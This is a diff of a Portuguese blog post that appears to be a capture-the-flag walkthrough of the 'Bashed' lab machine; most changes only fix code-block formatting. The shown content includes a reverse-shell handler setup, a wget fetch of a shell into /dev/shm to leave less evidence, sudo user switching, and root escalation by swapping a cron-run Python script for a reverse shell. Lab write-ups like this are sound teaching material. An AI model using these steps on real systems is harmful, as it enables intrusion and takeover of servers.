@@ -31,7 +31,7 @@ Mas nunca há realmente um "padrão". Eu uso esse processo como uma base frágil
 
 Então, comecei com um clássico scanner de portas usando o NMAP:
 
-https://gist.github.com/brerodrigues/90e91e1ad2f696b5b058f30005b1a540
+<script src="https://gist.github.com/brerodrigues/90e91e1ad2f696b5b058f30005b1a540.js"></script>
 
 Aparantemente o servidor só estava com a porta 80 aberta e rodando um servidor http apache. O passo seguinte foi acessar o site e analisa-lo.
 
@@ -59,12 +59,15 @@ Agora era preciso virar root e para isso uma webshell não é legal. Costumo usa
 
 Preparei meu pc para receber a shell:
 
-```brenno@budweiser ~/D/p/e/python-shellspython shell_handler.py 10.10.15.111:1338 -b[/]
+```
+brenno@budweiser ~/D/p/e/python-shellspython shell_handler.py 10.10.15.111:1338 -b[/]
 ```
 
 E, depois de ter alterado o arquivo back_connect.py e inserido meu endereço ip e porta para onde a shell reversa seria enviada, preparei um simples servidor http para enviar a shell.
 
-```brenno@budweiser ~/D/p/e/python-shellspython -m SimpleHTTPServer 8000 Serving HTTP on 0.0.0.0 port 8000 ...```
+```
+brenno@budweiser ~/D/p/e/python-shellspython -m SimpleHTTPServer 8000 Serving HTTP on 0.0.0.0 port 8000 ...
+```
 
 Na webshell, entrei no diretório <a href="https://www.cyberciti.biz/tips/what-is-devshm-and-its-practical-usage.html" target="_blank" rel="noopener">/dev/shm</a>, que é um diretório que usa a memória RAM para armazenar os dados, assim podemos deixar menos evidências no servidor ownado. Boas práticas na simulação leva a boas práticas na prática. Aí foi só mandar um wget para buscar a shell reversa.
 
@@ -78,25 +81,30 @@ Temos uma bela shell!
 
 Só pelo hábito, assim que peguei a shell, usei o comando <em>sudo -l</em> para ver se o usuário www-data tinha alguns privilégios:
 
-```www-data@bashed:/dev/shm$ sudo -l
+```
+www-data@bashed:/dev/shm$ sudo -l
 Matching Defaults entries for www-data on bashed:
 env_reset, mail_badpass,
 secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin
 
 User www-data may run the following commands on bashed:
 (scriptmanager : scriptmanager) NOPASSWD: ALL
-www-data@bashed:/dev/shm$```
+www-data@bashed:/dev/shm$
+```
 
 Olha só, podemos executar qualquer coisa como scriptmanager sem precisar usar senha.
 
-```www-data@bashed:/dev/shm$ sudo -u scriptmanager bash
-scriptmanager@bashed:/dev/shm$```
+```
+www-data@bashed:/dev/shm$ sudo -u scriptmanager bash
+scriptmanager@bashed:/dev/shm$
+```
 
 Virei scriptmanager. Soa melhor que <a href="https://askubuntu.com/questions/873839/what-is-the-www-data-user" target="_blank" rel="noopener">www-data</a>. E, como um usuário de verdade (sei disso porque lembrei de ter visto uma pasta para ele em /home), provavelmente tem mais privilégios.
 
 Foi aí que comecei a fuçar no servidor, vendo que serviços rodavam, se havia algum vulnerável, versão do kernel e <a href="https://blog.g0tmi1k.com/2011/08/basic-linux-privilege-escalation/" target="_blank" rel="noopener">o que era mais padrão para escalar privilégios</a>. Foi em meio a esse processo de reconhecimento que percebi algo fora do normal no diretório raiz: a pasta <em>scripts</em>.
 
-```scriptmanager@bashed:/$ ls -alh
+```
+scriptmanager@bashed:/$ ls -alh
 total 88K
 drwxr-xr-x 23 root root 4.0K Dec 4 13:02 .
 drwxr-xr-x 23 root root 4.0K Dec 4 13:02 ..
@@ -122,22 +130,27 @@ dr-xr-xr-x 13 root root 0 Feb 25 10:33 sys
 drwxrwxrwt 14 root root 4.0K Feb 25 13:51 tmp
 drwxr-xr-x 10 root root 4.0K Dec 4 11:13 usr
 drwxr-xr-x 12 root root 4.0K Dec 4 11:20 var
-lrwxrwxrwx 1 root root 29 Dec 4 11:14 vmlinuz -boot/vmlinuz-4.4.0-62-generic```
+lrwxrwxrwx 1 root root 29 Dec 4 11:14 vmlinuz -boot/vmlinuz-4.4.0-62-generic
+```
 
 E o que encontrei dentro desse diretório me fez suspeitar que estava no caminho certo:
 
-```scriptmanager@bashed:/scripts$ ls -l
+```
+scriptmanager@bashed:/scripts$ ls -l
 total 16
 -rw-r--r-- 1 scriptmanager scriptmanager 46 Feb 25 13:53 test.py
--rw-r--r-- 1 root root 12 Feb 25 11:03 test.txt```
+-rw-r--r-- 1 root root 12 Feb 25 11:03 test.txt
+```
 
 Ao verificar o conteúdo dos dois arquivos obtive:
 
-```scriptmanager@bashed:/scripts$ cat test.py
+```
+scriptmanager@bashed:/scripts$ cat test.py
 f = open("test.txt", "w")
 f.write("testing!")
 scriptmanager@bashed:/scripts$ cat test.txt
-testing!scriptmanager@bashed:/scripts$```
+testing!scriptmanager@bashed:/scripts$
+```
 
 De alguma forma o script python test.py era executado como root, abria o arquivo test.txt e escrevia a palavra "<em>testing!</em>". Essa porra parecia promissora. Então coloquei um shell handler para esperar uma conexão em outra porta no meu computador, substitui o arquivo test.py pelo meu script de shell reversa e esperei.
 
@@ -158,7 +171,8 @@ E confirmar uma suspeita que tive:
 
 root@bashed:/scripts# crontab -l
 * * * * * cd /scripts; for f in *.py; do python "$f"; done
-root@bashed:/scripts#```
+root@bashed:/scripts#
+```
 
 Aparentemente havia um <a href="http://blog.thiagobelem.net/o-que-sao-e-como-usar-as-cron-jobs" target="_blank" rel="noopener">cronjob</a> do usuário root responsável por executar qualquer script terminado em .py que estivesse na pasta /scripts. Nem era preciso substituir o test.py como fiz.
 
